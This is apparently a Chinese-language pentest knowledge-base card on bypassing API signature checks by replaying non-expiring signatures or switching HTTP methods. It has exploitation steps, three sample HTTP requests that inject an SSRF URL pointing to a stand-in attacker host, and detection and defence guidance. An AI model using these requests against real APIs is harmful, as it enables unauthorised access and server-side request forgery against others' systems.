---
id: web-generic-auth-api-signature-method-scope-replay-bypass
title: API 签名校验仅覆盖部分 HTTP 方法且无时效：换方法或重放旧签名绕过
type: scenario
domain: web
path: web/generic/auth
technique: api-signature-method-scope-replay-bypass
tags:
- api
- signature
- auth
- replay
- http-method
- bypass
- md5
- access-control
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V113
  verified_at: '2026-11-06T01:59:43+08:00'
  notes: 已对照原文与图28/36核对：报告明细明确旧签名a6647621…无时间过期、几小时后仍通过校验，且GET/PUT/DELETE/PATCH全部绕过签名过滤器；卡片合并两种绕过方式与原文一致。未验证点：原文未给完整请求/响应与签名算法，PoC为结构示意，未本机复跑；frontmatter无sources/source_url。
url: /docs/web/generic/auth/web-generic-auth-api-signature-method-scope-replay-bypass/
draft: false
kb_aliases:
- 签名校验方法绕过
- GET/PUT/DELETE/PATCH 绕过签名
- 签名重放
- sign 无时间戳过期
- 签名中间件条件启用
- 前端签名保护绕过
---

## 一句话结论

当后端只对部分 HTTP 方法（常见是 POST）执行 `sign` 校验，且签名本身没有时间戳/nonce/过期校验时，攻击者可以重放几小时前抓到的旧签名，或把同一业务操作改成 GET/PUT/DELETE/PATCH 发送，从而绕过签名过滤器调用受保护接口；原文案例中该缺陷与内容导入接口组合，最终打通 SSRF。

## 原理

- 前端签名通常把业务参数按规则拼接后计算 MD5/HMAC，并把 `sign` 放在查询串或请求头；后端由中间件/过滤器校验。
- 两类实现缺陷会导致绕过：
  1. **方法维度漏配**：签名过滤器只注册在 POST 路由上，或只对 `Content-Type: application/json` 的请求生效；GET/PUT/DELETE/PATCH 路由没有挂同一中间件，业务逻辑却仍接受这些方法。
  2. **无时效/无一次性校验**：签名只覆盖参数内容，不包含 timestamp，也不校验 nonce；同一个 `sign` 可以无限次重放，几小时后仍然有效。
- 攻击者只需抓取一个合法签名请求，保持 `sign` 不变，改变 HTTP 方法或调整参数位置（body→query），若业务成功返回，说明签名没有被真正绑定到“方法 + 路径 + 时间 + 一次性随机数”。
- 这类缺陷的本质是“签名保护”被实现成了某个路由的装饰，而不是覆盖所有入口的统一安全边界；前端可见的 `pointParam`/`key` 字段还会进一步泄露参与签名的参数集合与密钥线索。

## 触发条件

- 目标 API 使用 `sign`/`signature` 查询参数或请求头做签名保护，且攻击者能抓到至少一个合法签名请求（登录态或公开接口均可）。
- 后端只在部分 HTTP 方法/路由上校验签名，或校验逻辑可被方法切换、参数位置变化绕过。
- 签名不包含时间戳/有效期，或服务端不校验时间窗；也不做 nonce 一次性消费。
- 业务接口在签名被绕过之后仍执行原有权限逻辑（或本身缺少对象级授权），攻击者才能获得实际越权效果。

## 利用步骤

1. 在浏览器/代理中抓取一个带 `sign` 的合法请求，记录完整 URL、方法、Body、Cookie、签名相关字段（`sign`、`timestamp`、`nonce`、`pointParam`、`key` 等）。
2. 原样重放该请求，确认基线成功；等待数十分钟到数小时后再次原样重放，观察旧 `sign` 是否仍被接受（无时效校验）。
3. 保持 `sign` 与业务参数不变，依次把方法改为 GET/PUT/DELETE/PATCH；必要时把 JSON body 改写成 query 参数或表单，观察是否绕过签名过滤器并返回业务成功。
4. 若成功，替换业务参数（如 URL、对象 ID、项目 ID）测试越权/SSRF/IDOR，确认签名绕过带来的实际危害。
5. 测试时控制请求频率，不执行删除/批量导出等破坏性操作；记录每次请求的方法、状态码与业务响应作为证据。

## PoC

```http
# 基线：合法签名的 POST
POST /api/v1/source/create?sign=<valid_sign>&pointParam=projectId,url HTTP/1.1
Host: target
Content-Type: application/json
Cookie: <session>

{"projectId":"<id>","sources":[{"type":"WEB","url":"http://attacker.example/"}]}
```

```http
# 变体 1：重放几小时前的旧 sign（无 timestamp/nonce 校验）
POST /api/v1/source/create?sign=<old_sign>&pointParam=projectId,url HTTP/1.1
Host: target
Content-Type: application/json
Cookie: <session>

{"projectId":"<id>","sources":[{"type":"WEB","url":"http://attacker.example/"}]}
```

```http
# 变体 2：切换 HTTP 方法，绕过只挂在 POST 上的签名过滤器
GET /api/v1/source/create?sign=<old_sign>&projectId=<id>&url=http://attacker.example/ HTTP/1.1
Host: target
Cookie: <session>
```

原文案例的验证结论：旧签名 `a6647621...` 无时间过期，几小时后仍通过校验；GET/PUT/DELETE/PATCH 全部绕过签名过滤器（报告将其列为 High，CVSS 7.5）。原文未给出完整请求/响应与签名算法，PoC 为按该结论构造的结构示意，需按目标实际参数调整。

## 变体与关联

- 变体：签名只覆盖 body 不覆盖 query，攻击者把参数从 body 移到 query 或反之，改变实际业务语义但签名仍通过。
- 变体：签名包含 timestamp 但服务端不校验时间窗；或 nonce 只检查格式不检查是否已使用。
- 变体：前端 `pointParam` 明确列出参与签名的参数，`key` 字段暗示密钥；可结合前端 JS 逆向直接重算签名（关联签名算法还原/硬编码密钥类卡片）。
- 关联：[[web-generic-auth-api-signature-validation-differential-test]]（判断签名是否真正生效）、[[web-generic-auth-client-nonce-weak-sha1-signature-forgery]]（nonce/弱签名伪造）、[[pentest-recon-browser-interactive-click-capture-hidden-api]]（浏览器交互发现签名请求）。

## 检测与防御

- 防御：签名校验必须作为统一中间件覆盖所有方法、所有路由和所有参数位置（query/body/header），不能只在 POST 上注册。
- 防御：签名内容绑定 HTTP 方法、路径、业务参数、body 哈希、timestamp 与 nonce；服务端校验时间窗（如 ±5 分钟）并一次性消费 nonce。
- 防御：签名密钥只保存在服务端；前端只做传输封装，不持有可用于重算的长期密钥。
- 检测：同一 `sign` 在时间窗外或跨方法重复出现；同一会话对同一接口切换多种 HTTP 方法；签名校验失败率与业务成功率异常。
- 响应：发现旧签名/跨方法请求成功后，立即轮换签名密钥、收紧中间件挂载范围，并审计该时间段内被调用的敏感接口与参数。
